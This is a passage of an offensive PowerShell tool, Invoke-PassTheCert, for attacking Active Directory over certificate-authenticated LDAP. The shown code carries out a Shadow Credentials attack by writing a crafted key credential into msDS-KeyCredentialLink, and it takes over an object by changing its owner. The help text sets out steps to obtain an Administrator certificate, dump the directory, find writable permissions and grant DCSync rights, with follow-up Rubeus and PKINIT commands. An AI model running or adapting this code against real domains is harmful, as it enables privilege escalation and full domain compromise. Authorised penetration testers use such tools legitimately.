                $Identifier             = [System.Security.Cryptography.SHA256]::Create().ComputeHash($RawKeyMaterial)
                $CreationTime           = [datetime]::UtcNow.ToFileTimeUtc()
                $KeyUsage               = [byte]0x01
                $KeySource              = [byte]0x00
                $DeviceId               = [Guid]::NewGuid()
                
                # 2.a. Initialize Entries IDs
                # https://github.com/MichaelGrafnetter/DSInternals/blob/6fe15cab429f51d91e8b281817fa23b13804456c/Src/DSInternals.Common/Data/Hello/
                $Entry_KeyID            = [byte]0x01
                $Entry_KeyHash          = [byte]0x02
                $Entry_KeyMaterial      = [byte]0x03
                $Entry_KeyUsage         = [byte]0x04
                $Entry_KeySource        = [byte]0x05
                $Entry_DeviceId         = [byte]0x06
                $Entry_KeyCreationTime  = [byte]0x09


                # 3. Build Blobs (CustomKeyInfo and LastLogonTime are not specified)
                # https://github.com/MichaelGrafnetter/DSInternals/blob/6fe15cab429f51d91e8b281817fa23b13804456c/Src/DSInternals.Common/Data/Hello/KeyCredential.cs#L425-L510

                # 3.a Properties Blob
                $propertyStream = New-Object System.IO.MemoryStream
                $propertyWriter = New-Object System.IO.BinaryWriter $propertyStream

                $propertyWriter.Write([uint16]$RawKeyMaterial.Length)
                $propertyWriter.Write([byte]$Entry_KeyMaterial)
                $propertyWriter.Write([byte[]]$RawKeyMaterial)
                #Write-Verbose "RawKeyMaterial $($RawKeyMaterial.Length) propertyWriter length so far: $($propertyStream.Length)"

                $propertyWriter.Write([uint16]$KeyUsage.Length)
                $propertyWriter.Write([byte]$Entry_KeyUsage)
                $propertyWriter.Write([byte[]]$KeyUsage)
                #Write-Verbose "KeyUsage $($KeyUsage.Length) propertyWriter length so far: $($propertyStream.Length)"

                $propertyWriter.Write([uint16]$KeySource.Length)
                $propertyWriter.Write([byte]$Entry_KeySource)
                $propertyWriter.Write([byte[]]$KeySource)
                #Write-Verbose "KeySource $($KeySource.Length) propertyWriter length so far: $($propertyStream.Length)"

                $propertyWriter.Write([uint16]$DeviceId.ToByteArray().Length)
                $propertyWriter.Write([byte]$Entry_DeviceId)
                $propertyWriter.Write([byte[]]$DeviceId.ToByteArray())
                #Write-Verbose "DeviceId $($DeviceId.ToByteArray().Length) propertyWriter length so far: $($propertyStream.Length)"

                $propertyWriter.Write([uint16]([BitConverter]::GetBytes($CreationTime)).Length)
                $propertyWriter.Write([byte]$Entry_KeyCreationTime)
                $propertyWriter.Write([byte[]]([BitConverter]::GetBytes($CreationTime)))
                #Write-Verbose "CreationTime $([BitConverter]::GetBytes($CreationTime).Length) propertyWriter length so far: $($propertyStream.Length)"

                $binaryProperties = $propertyStream.ToArray()


                # 3.b Key Credential Blob
                $blobStream = New-Object System.IO.MemoryStream
                $blobWriter = New-Object System.IO.BinaryWriter $blobStream

                $blobWriter.Write([uint32]$Version)
                #Write-Verbose "Version $($Version.Length) blobWriter length so far: $($blobStream.Length)"

                $blobWriter.Write([uint16]$Identifier.Length)
                $blobWriter.Write([byte]$Entry_KeyID)
                $blobWriter.Write([byte[]]$Identifier)
                #Write-Verbose "Identifier $($Identifier.Length) blobWriter length so far: $($blobStream.Length)"

                $keyHash = [System.Security.Cryptography.SHA256]::Create().ComputeHash($binaryProperties)
                $blobWriter.Write([uint16]$keyHash.Length)
                $blobWriter.Write([byte]$Entry_KeyHash)
                $blobWriter.Write([byte[]]$keyHash)
                #Write-Verbose "keyHash $($keyHash.Length) blobWriter length so far: $($blobStream.Length)"

                $blobWriter.Write([byte[]]$binaryProperties)
                #Write-Verbose "binaryProperties $($binaryProperties.Length) blobWriter length so far: $($blobStream.Length)"

                $binaryKeyCredential = $blobStream.ToArray()


                # 4. Convert into DN With Binary String
                # https://github.com/MichaelGrafnetter/DSInternals/blob/6fe15cab429f51d91e8b281817fa23b13804456c/Src/DSInternals.Common/Data/Hello/KeyCredential.cs#L512-L516
                $Hex = ($binaryKeyCredential | ForEach-Object { '{0:X2}' -f $_ }) -join ''
                $DNWithBinary = "B:$($Hex.Length):$($Hex):$TargetDN"
                
                # 5. Populate !
                _AddValueInAttribute -LdapConnection $LdapConnection -IdentityDN $TargetDN -Attribute 'msDS-KeyCredentialLink' -Value $DNWithBinary

                Write-Host "[*$Exploit*] [Check] Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection `$LdapConnection -Enum 'ShadowCreds'"
                Write-Host "[*$Exploit*] [Authenticate] gettgtpkinit.py -dc-ip <dc_ip> -cert-pfx '$sAMAccountName.pfx' -pfx-pass '' $(_Helper-GetDomainNameFromDN -DN $TargetDN)/'$sAMAccountName' './out.ccache'"
                Write-Host "[*$Exploit*] [Authenticate] Rubeus.exe asktgt /dc:<dc_ip> /user:'$sAMAccountName' /certificate:'$sAMAccountName.pfx' /password:'' /domain:$(_Helper-GetDomainNameFromDN -DN $TargetDN) /nowrap"


            } catch { 

                Write-Host "[*$Exploit*] [!] Exploitation Failed With Error: $_"; 
                Write-Host "[*$Exploit*] [*] Hint: Do You Have Write Privileges Against The '$TargetDN':'msDS-KeyCredentialLink' Attribute ? If Not, You May Execute (If Allowded):"
                Write-Host "[*$Exploit*] [Grant] Invoke-PassTheCert -Action 'CreateInboundSDDL' -LdapConnection `$LdapConnection -Identity '$(_GetSubjectDNFromLdapConnection -LdapConnection $LdapConnection)' -Target '$TargetDN' -Attribute 'msDS-KeyCredentialLink' -SDDLACEType 'OA' -SDDLACERights 'RPWP'"
                return

            }
            
        }

        "Owner" {
            
            if (-not (_Helper-IsEveryValueOfArrayDefined @($OwnerSID, $TargetDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Is Missing ! Check Examples Adding -h ! Returning..."; return; }

            Write-Verbose "[*$Exploit*] Setting '$OwnerSID' As Owner Of Target '$TargetDN'..."
            
            # Locally editing the target's nTSecurityDescriptor's owner
            $SD = _GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $TargetDN -Attribute 'nTSecurityDescriptor'
            $SD.Owner = [System.Security.Principal.SecurityIdentifier]::new(
                $OwnerSID
            )
            $NewSD = New-Object byte[] $SD.BinaryLength
            $SD.GetBinaryForm($NewSD, 0)

            # Pushing the modification to LDAP
            $Modification = New-Object System.DirectoryServices.Protocols.ModifyRequest(
                $TargetDN,
                [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace,
                'nTSecurityDescriptor'
            )
            $Modification.Controls.Add(
                (New-Object System.DirectoryServices.Protocols.SecurityDescriptorFlagControl(
                    [System.DirectoryServices.Protocols.SecurityMasks]::Owner
                ))
            ) |Out-Null
            $Modification.Modifications[0].Add($NewSD) |Out-Null
            $LdapConnection.SendRequest(
                $Modification
            ) |Out-Null

            Write-Host "[*$Exploit*] [+] Successfully Set '$OwnerSID' As Owner Of Target '$TargetDN' !"
            Write-Host "[*$Exploit*] [Check] Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection `$LdapConnection -Enum 'Owner' -Object '$TargetDN'"

        }

        Default { Write-Host "[!] LDAP Exploitation '$Exploit' Not Recognized !"; return }
    }
}


function _TODO {
    
    <#

        .SYNOPSIS

            Makin' My Own Custom Function.

            - The Custom Function MUST be implemented by YOU !

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .PARAMETER Customizator

            [System.Custom] 
            
            The Customizator parameter of the Customized Custom Stuff (i.e. `Customorus1` or `Customorus2`) (Mandatory)

        .PARAMETER Customizatoration

            [System.Custom] 
            
            The Customizatoration parameter on which the Customized Custom Stuff must be applied on Customizing'ly (Optional).

            - If not specified, defaults to 'root'

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _TODO -LdapConnection $LdapConnection -Customizator 'Customorus1'

            Customizing'ly Customizes a Customized Customization whose customed value is `Customorus1` using the `root` Customizatoration (default) against which a Customization must be applied on Customizing'ly.

        .EXAMPLE

            _TODO -LdapConnection $LdapConnection -Customizator 'Customorus2' -Customizatoration '7toor'

            Customizing'ly Customizes a Customized Customization whose customed value is `Customorus2` using the `7toor` Customizatoration against which a Customization must be applied on Customizing'ly.

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection

        .LINK

            https://en.wikipedia.org/wiki/Customization

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,

        [Parameter(Position=1, Mandatory=$true, HelpMessage="The Customizator value of the Customized Custom Stuff.")]
        [ValidateSet('Customorus1', 'Customorus2')]
        $Customizator,

        [Parameter(Position=2, Mandatory=$false, HelpMessage="The Customizatoration on which the Customized Custom Stuff must be applied on Customizing'ly (Optional).")]
        [PSDefaultValue(Help="Defaults to root Customizatoration")]
        $Customizatoration = 'root'
    )
    
    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    Write-Verbose "[*] Customizing'ly Customizing a Customized Customization whose customed value is '$Customizator' using the '$Customizatoration' Customizatoration against which a Customization must be applied on Customize'ly..."

    # Doing Very Complexy Stuff...
    #if (-not $Customizatoration) { $Customizatoration = 'root' } #Default
    $IsCustomized = Get-Random -InputObject @($true, $false)

    if ($IsCustomized) {
        Write-Host "[+] Successfully Customizing'ly Customizing a Customized Customization whose customed value is '$Customizator' using the '$Customizatoration' Customizatoration against which a Customization must be applied on Customizing'ly !"
    } else {
        Write-Host "[!] Customizing'ly Customizing a Customized Customization whose customed value is '$Customizator' using the '$Customizatoration' Customizatoration against which a Customization must be applied on Customizing'ly Failed !"
    }

    Write-Host ""

}




# ===================================
# ===      Invoke-PassTheCert     ===
# ===================================

function Invoke-PassTheCert-GetLDAPConnectionInstance {
    
    <#

        .SYNOPSIS

            Returns an object containing the LDAP Connection Instance upon after certificate-authenticating to an LDAP/S Server.

        .PARAMETER Server

            [System.String] 
            
            The IP of the LDAP/S Server against which to certificate-authenticate

        .PARAMETER Port

            [System.Int32] 
            
            The port of the LDAP/S Server against which to certificate-authenticate

        .PARAMETER Certificate

            [System.String] 
            
            The FilePath of Base64String of the certificate to use to authenticate against the LDAP/S Server

        .PARAMETER CertificatePassword

            [System.String] 
            
            The password of the certificate used to certificate-authenticate (if applicable, i.e. if the certificate is password-protected)
            
            - Optional if "$Certificate" is NOT password-protected (i.e. passwordless certificate)
            - Mandatory if "$Certificate" is password-protected

        .EXAMPLE

            Invoke-PassTheCert-GetLDAPConnectionInstance -Server '192.168.56.202' -Certificate 'Administrator.pfx'

            Returns an object with the LDAP Connection Instance to the LDAP/S Server '192.168.56.202:636', using the certificate 'Administrator.pfx' (not password protected, hence no password provided)

        .EXAMPLE

            Invoke-PassTheCert-GetLDAPConnectionInstance -Server '192.168.56.202' -Port 1636 -Certificate 'Administrator.pfx' -CertificatePassword 'P@ssw0rd123!'

            Returns an object with the LDAP Connection Instance to the LDAP/S Server '192.168.56.202:1636', using the Certificate 'Administrator.pfx' protected with password 'P@ssw0rd123!'

        .EXAMPLE

            Invoke-PassTheCert-GetLDAPConnectionInstance -Server '192.168.56.202' -Certificate 'MIINA...'

            Returns an object with the LDAP Connection Instance to the LDAP/S Server '192.168.56.202:636', using the 'MIINA...' Base64 form of a certificate (not password protected, hence no password provided)

        .EXAMPLE

            Invoke-PassTheCert-GetLDAPConnectionInstance -Server '192.168.56.202' -Port 2636 -Certificate 'MIINA...' -CertificatePassword 'P@ssw0rd123!'

            Returns an object with the LDAP Connection Instance to the LDAP/S Server '192.168.56.202:2636', using the 'MIINA...' Base64 form of the certificate protected with password 'P@ssw0rd123!'.

        .OUTPUTS

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            An object containing the LDAP Connection Instance upon after certificate-authenticating to an LDAP/S Server.

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the IP of the LDAP/S Server against which to certificate-authenticate")]
        [System.String]$Server,
        
        [Parameter(Position=1, Mandatory=$false, HelpMessage="Enter the port of the LDAP/S Server against which to certificate-authenticate")]
        [PSDefaultValue(Help="636 (Server's LDAPS Port)")]
        [System.Int32]$Port = 636,
        
        [Parameter(Position=2, Mandatory=$true, HelpMessage="Enter the FilePath or Base64String of the certificate")]
        [System.String]$Certificate,
        
        [Parameter(Position=3, Mandatory=$false, HelpMessage="Enter the password of the certificate (if applicable, i.e. if the certificate is password-protected)")]
        [PSDefaultValue(Help="Empty string if the certificate is NOT password-protected (i.e. passwordless certificate)")]
        [System.String]$CertificatePassword = '',
        
        [Parameter(Position=4, Mandatory=$false, HelpMessage="Don't show the banner whenever set :(")]
        [PSDefaultValue(Help="Show the banner")]
        [switch]$NoBanner = $false
    )

    if (-not $NoBanner) {  _ShowBanner; }
    
    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    try {
        # Load client certificate
        $LoadedCertificate = _Helper-GetCertificateFromFileOrBase64 -Certificate $Certificate -CertificatePassword $CertificatePassword
        
        # Set LDAP connection
        Write-Host "[*] Connecting To LDAP/S Server $($Server):$($Port)..."
        $LdapConnection = New-Object System.DirectoryServices.Protocols.LdapConnection(
            New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(
                $Server, 
                $Port
            )
        )
        
        # Set certificate authentication
        $LdapConnection.ClientCertificates.Add($LoadedCertificate) |Out-Null
        $LdapConnection.SessionOptions.SecureSocketLayer = $true
        # Skip certificate verification
        $LdapConnection.SessionOptions.VerifyServerCertificate = { return $true }
        
        Write-Host "[+] Successfully Connected To LDAP/S Server $($LdapConnection.SessionOptions.HostName) !"
        Write-Host "[*] The CA Issuer Of The Instance Of The Established LDAP Connection Is '$(_GetIssuerDNFromLdapConnection -LdapConnection $LdapConnection)'"
        Write-Host "[*] The Subject Of The Instance Of The Established LDAP Connection Is '$(_GetSubjectDNFromLdapConnection -LdapConnection $LdapConnection)'"

        Write-Host ""

        return $LdapConnection

    } catch { Write-Host "[!] Getting An LDAP Connection Instance Authenticating With The Certificate Failed With Error: $_"; return }
    
    Write-Host ""
}


function Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile {
    
    <#

        .SYNOPSIS

            Exports an LDAP Connection Instance to a certificate file

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .PARAMETER ExportPath

            [System.String] 
            
            The path of the certificate to be exported

        .PARAMETER ExportContentType

            [System.String] 
            
            The ContentType of the certificate to be exported (among 'Cert', 'SerializedCert', 'Pfx', 'Pkcs12', 'SerializedStore', 'Pkcs7', 'Authenticode') (Optional)
            
            - If not specified, defaults to 'pfx'

        .PARAMETER ExportPassword

            [System.String] 
            
            The password of the certificate to be exported (Optional)

            - If not specified, defaults to '', i.e. passwordless

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile -LdapConnection $LdapConnection -ExportPath '.\Certified.pfx' -ExportContentType 'pfx' -ExportPassword 'ExP0rTP@sssw0Rd123!'

            Exports the $LdapConnection LDAP Connection Instance into the PFX file '.\Certified.pfx', protected with password 'ExP0rTP@sssw0Rd123!'

        .EXAMPLE

            Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile -LdapConnection $LdapConnection -ExportPath '.\Certified.pfx' -ExportContentType 'pfx'

            Exports the $LdapConnection LDAP Connection Instance into the passwordless PFX file '.\Certified.pfx'

        .EXAMPLE

            Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile -LdapConnection $LdapConnection -ExportPath '.\Certified.p12' -ExportContentType 'pkcs12' -ExportPassword 'ExP0rTP@sssw0Rd123!'

            Exports the $LdapConnection LDAP Connection Instance into the PKCS #12 file '.\Certified.p12', protected with password 'ExP0rTP@sssw0Rd123!'

        .EXAMPLE

            Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile -LdapConnection $LdapConnection -ExportPath '.\Certified.p12' -ExportContentType 'pkcs12'

            Exports the $LdapConnection LDAP Connection Instance into the PKCS #12 file '.\Certified.p12', passwordless

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection

        .LINK 

            https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.x509certificates.x509certificate.export
        
        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.x509certificates.x509contenttype

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance from which a an exported certificate file will be exported")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,

        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the path of the certificate to export")]
        [System.String]$ExportPath,

        [Parameter(Position=2, Mandatory=$false, HelpMessage="Enter the type of the certificate to export ('Unknown', 'Cert', 'SerializedCert', 'Pfx', 'Pkcs12', 'SerializedStore', 'Pkcs7', or 'Authenticode')")]
        [ValidateSet('Unknown', 'Cert', 'SerializedCert', 'Pfx', 'Pkcs12', 'SerializedStore', 'Pkcs7', 'Authenticode')]
        [PSDefaultValue(Help="Pfx by default")]
        [System.String]$ExportContentType = 'Pfx',

        [Parameter(Position=3, Mandatory=$false, HelpMessage="Enter the password of the certificate to export")]
        [PSDefaultValue(Help="Empty password by default")]
        [System.String]$ExportPassword = '',

        [Parameter(Position=4, Mandatory=$false, HelpMessage="Don't show the banner whenever set :(")]
        [PSDefaultValue(Help="Show the banner")]
        [switch]$NoBanner = $false
    )

    if (-not $NoBanner) {  _ShowBanner; }

    Write-Host ""

    _Helper-ExportCertificateToFile -Certificate $LdapConnection.ClientCertificates[0] -ExportPath $ExportPath -ExportContentType $ExportContentType -ExportPassword $ExportPassword

    Write-Host ""
}


function Invoke-PassTheCert {

    <#

        .SYNOPSIS

            Main function to perform various LDAP Operations after using an established LDAP Connection Instance to an LDAP/S Server through Schannel authentication with a certificate.
        
        .DESCRIPTION

            [0] Grab a certificate using your favorite tool:
                
                From Linux:

                    $ sudo apt install -y certipy-ad
                    $ certipy-ad find -u '<user>@<domain>' -p '<password>' -enabled -stdout [-ns <dns_ip>] [-dc-ip <dc_ip>]
                    $ certipy-ad req -u '<user>@<domain>' -p '<password>' -target '<dc_fqdn>' -ca '<ca_name>' -template 'User' [-ns <dns_ip>] [-dc-ip <dc_ip>] [-dc-host '<dc_host>']


                From Windows (https://github.com/GhostPack/Certify/issues/13):

                    Note: 
                    - The below steps are based on the provided `Administrator.inf` file. Here, we want a `User` certificate template as the `Administrator` user in the domain `ADLAB.LOCAL`.
                    - No need to run mmc.exe if you already trust the CA's certificate. Hence, you may skip to the `certreq` commands.
                    - If the DC's network interface has the `File and Printer Sharing for Microsoft Networks` item unchecked, the MMC won't be able to connect to the domain, erroring-out `The domain X could not be found because: The RPC server is unavailable`.

                    PS > runas /netonly /user:ADLAB.LOCAL\Administrator powershell.exe

                    PS (runas) > mmc.exe /server:<dc_ip>
                    GUI > CTRL+M (i.e. `File > Add/Remove Snap-in) > Certificates > Computer Account > Another computer > DC02 > Check Names`
                    GUI > Certificates (\\DC02) > \\DC02\Personal > Find Certificates...
                        Find in: \\DC02\Personal
                        Contains: -
                        ADLAB-DC02-CA > Export > DER encoded binary X.509 (.CER)
                        ADLAB-DC02-CA.cer > Install Certificate... > Current User & Local Machine > Automatically select the certificate store based on the type of certificate

                    PS (runas) > certreq -f -v -new Administrator.inf Administrator.req
                        [...]
                        Template not found.  Do you wish to continue anyway?
                        User
                        CERT_DIGITAL_SIGNATURE_KEY_USAGE: 80 -> 80
                        CERT_KEY_ENCIPHERMENT_KEY_USAGE: 20 -> a0
                        PKCS10: 1 -> 1
                        CertReq: Request Created

                    PS (runas) > certreq -f -v -submit -config "192.168.56.202\ADLAB-DC02-CA" Administrator.req Administrator.cer
                        [...]
                        RequestId: 20
                        RequestId: "20"
                        Certificate retrieved(Issued) Issued  0x80094004, The Enrollee (CN=Administrator,CN=Users,DC=ADLAB,DC=LOCAL) has no E-Mail name registered in the Active Directory.  The E-Mail name will not be included in the certificate.

                    PS (runas) > certreq -f -accept -user -config "192.168.56.202\ADLAB-DC02-CA" Administrator.rsp
                        Installed Certificate:
                        Serial Number: 4d00000017a8fe1345f16fc666000000000017
                        Subject: CN=Administrator, CN=Users, DC=X (Other Name:Principal Name=Administrator@ADLAB.LOCAL)
                        NotBefore: <DATE>
                        NotAfter: <DATE>
                        Thumbprint: 7346002CB3068527826DACEBEC9A5A62B71FE685

                    PS > Get-ChildItem Cert:\CurrentUser\My | Where-Object { $_.HasPrivateKey }
                        [...]
                        7346002CB3068527826DACEBEC9A5A62B71FE685  CN=Administrator, CN=Users, DC=ADLAB, DC=LOCAL

                    PS > Export-PfxCertificate -Cert (Get-ChildItem Cert:\CurrentUser\My\7346002CB3068527826DACEBEC9A5A62B71FE685) -FilePath 'Administrator.pfx' -Password (New-Object System.Security.SecureString)


            [1] Import the script into your current PowerShell session:

                PS > Import-Module .\Invoke-PassTheCert.ps1
    

            [2] Grab an LDAP Connection Instance, authenticating to an LDAP/S Server using a passwordless/password-protected certificate:

                PS > $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

                - You MAY export that LDAP Connection Instance into a passwordless/password-protected certificate; for instance:
                    PS > Get-Help Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile -Full
                    PS > Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile -LdapConnection $LdapConnection -ExportPath '.\Certified.pfx' -ExportContentType 'pfx'
                    PS > Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile -LdapConnection $LdapConnection -ExportPath '.\Certified.pfx' -ExportContentType 'pfx' -ExportPassword 'ExP0rTP@sssw0Rd123!'
                    PS > Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile -LdapConnection $LdapConnection -ExportPath '.\Certified.p12' -ExportContentType 'pkcs12'
                    PS > Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile -LdapConnection $LdapConnection -ExportPath '.\Certified.p12' -ExportContentType 'pkcs12' -ExportPassword 'ExP0rTP@sssw0Rd123!'


            [3] List all the available Actions:

                PS > Invoke-PassTheCert -a -NoBanner


            [4] Use any of the following commands on an Action to execute its Get-Help; for instance:

                PS > Invoke-PassTheCert -Action 'Filter' -h / -hd        # 'Detailed' Get-Help
                PS > Invoke-PassTheCert -Action 'LDAPEnum' -he           # 'Examples' Get-Help
                PS > Invoke-PassTheCert -Action 'LDAPExploit' -hh / -hf  # 'Full' Get-Help
            

            [5] Enjoy ! For instance (you MAY add `-Verbose`):
                
                PS > $DumpLdap = Invoke-PassTheCert -Action 'Filter' -LdapConnection $LdapConnection -SearchBase 'DC=X' -SearchScope Subtree -Properties * -LDAPFilter '(objectClass=*)'
                PS > $DumpLdap |?{$_.sAMAccountName -ne $null -and ($_.useraccountcontrolnames -like '*WORKSTATION_TRUST_ACCOUNT*' -or $_.useraccountcontrolnames -like '*NORMAL_ACCOUNT*')} |Select-Object sAMAccountName,description,useraccountcontrolnames,distinguishedname,serviceprincipalname |fl
                
                PS > $DumpInboundACLsWrite = Invoke-PassTheCert -Action 'GetInboundACEs' -LdapConnection $LdapConnection -ObjectDN 'CN=Kinda KU. USY,CN=Users,DC=X'
                PS > $DumpInboundACLsWrite |?{ $_.AceQualifier -eq 'AccessAllowed' -and ($_.AccessMaskNames -ilike '*GenericAll*' -or $_.AccessMaskNames -ilike '*GenericWrite*' -or $_.AccessMaskNames -ilike '*WriteProperty*' -or $_.AccessMaskNames -ilike '*WriteDACL*') -and $_.SecurityIdentifier -match 'S-1-5-21-(\d+-){3}\d{3,}' }

                PS > Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection $LdapConnection -Enum 'DCSync'

                PS > Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $LdapConnection -Exploit 'DCSync' -Identity 'CN=John JD. DOE,CN=Users,DC=X' -Target 'DC=X'
                PS > Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $LdapConnection -Exploit 'DCSync' -Identity 'jdoe' -IdentityDomain 'X' -Target 'DC=X'

        .PARAMETER Action

            [System.String] 
            
            The action to perform (e.g. 'LDAPExtendedOperationWhoami' to get the identity of the client authenticated via certificate)

        .PARAMETER Help, h

            [Switch] 
            
            Enables the Get-Help display for the specified Action.

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance. 
            
            - Can be retrieved via the 'Invoke-PassTheCert-GetLDAPConnectionInstance' function
            - Optional if the Server, Port, Certificate, and CertificatePassword (if applicable, i.e. if the certificate is password-protected) parameters are provided.

        .PARAMETER Server

            [System.String] 
            
            The IP of the LDAP/S Server against which to certificate-authenticate

        .PARAMETER Port

            [System.Int32] 
            
            The port of the LDAP/S Server against which to certificate-authenticate

        .PARAMETER Certificate

            [System.String] 
            
            The FilePath of Base64String of the certificate to use to authenticate against the LDAP/S Server

        .PARAMETER CertificatePassword

            [System.String] 
            
            The password of the certificate used to certificate-authenticate (if applicable, i.e. if the certificate is password-protected)

            - Optional if "$Certificate" is NOT password-protected (i.e. passwordless certificate)
            - Mandatory if "$Certificate" is password-protected

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            Import-Module .\Invoke-PassTheCert.ps1

            Imports the Public PowerShell Functions of the Invoke-PassTheCert.ps1 script into the current PowerShell session.

        .EXAMPLE

            Invoke-PassTheCert -Action 'Filter' -h -NoBanner

            Shows the Detailed Get-Help of the 'Filter' Action, without displaying the Banner.

        .EXAMPLE

            Invoke-PassTheCert -Action 'AddGroupMember' -he

            Shows the Examples Get-Help of the 'AddGroupMember' Action.

        .EXAMPLE

            Invoke-PassTheCert -Action 'LDAPExtendedOperationWhoami' -hh

            Shows the Full Get-Help of the 'LDAPExtendedOperationWhoami' Action.

        .LINK

            https://github.com/The-Viper-One/Invoke-PassTheCert

        .LINK

            https://github.com/AlmondOffSec/PassTheCert

        .LINK 
        
            https://www.thehacker.recipes/ad/movement/schannel/passthecert

    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$false, HelpMessage="Enter the action to perform (e.g. 'Whoami' to get the identity of the client authenticated via certificate")]
        [ValidateSet(
            'LDAPExtendedOperationWhoami',
            'LDAPExtendedOperationPasswordModify',
            'Filter',
            'CreateObject',
            'DeleteObject',
            'GetInboundACEs',
            'CreateInboundACE',
            'DeleteInboundACE',
            'GetInboundSDDLs',
            'CreateInboundSDDL',
            'UpdatePasswordOfIdentity',
            'OverwriteValueInAttribute',
            'AddValueInAttribute',
            'RemoveValueInAttribute',
            'ClearAttribute',
            'ShowStatusOfAccount',
            'EnableAccount',
            'DisableAccount',
            'AddGroupMember',
            'RemoveGroupMember',
            'LDAPEnum',
            'LDAPExploit',
            'TODO'
        )]
        [PSDefaultValue(Help="Defaults to 'Who Am I?' LDAP Extended Operation")]
        [System.String]$Action,
        

        # =========================================
        # =====        BUILDING BLOCKS        =====
        # =========================================

        [Parameter(Position=1, Mandatory=$false, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,
        
        [Parameter(Position=2, Mandatory=$false, HelpMessage="Enter the FilePath or Base64String of the certificate")]
        [System.String]$Certificate,
        
        [Parameter(Position=3, Mandatory=$false, HelpMessage="Enter the password of the certificate (if applicable, i.e. if the certificate is password-protected)")]
        [System.String]$CertificatePassword,

        [Parameter(Position=4, Mandatory=$false, HelpMessage="Enter the IP of the LDAP/S Server against which to certificate-authenticate")]
        [System.String]$Server,
        
        [Parameter(Position=5, Mandatory=$false, HelpMessage="Enter the port of the LDAP/S Server against which to certificate-authenticate")]
        [PSDefaultValue(Help="Defaults to 636")]
        [System.Int32]$Port = 636,

        [Parameter(Position=6, Mandatory=$false, HelpMessage="Enter the Distinguished Name of the Seach Base of the LDAP lookup")]
        [PSDefaultValue(Help="Defaulting to an empty string allows to differentiate from an undefined value (hence empty string here), and `$null (specifically used to look for the RootDSE)")]
        # Not setting its type [System.String] allows to differentiate '' and $null
        # If we use [System.String]$SearchBase, then we won't be allowed to differentiate when the variable is set to '', or $null => It will always be considered as '', even if unspecified from the command line.
        # Being able to tell when this parameter is $null (and NOT '') can be handy to differentiate, for instance, if the user specifically request the RootDSE (setting the SearchBase to $null).
        $SearchBase = '',
        
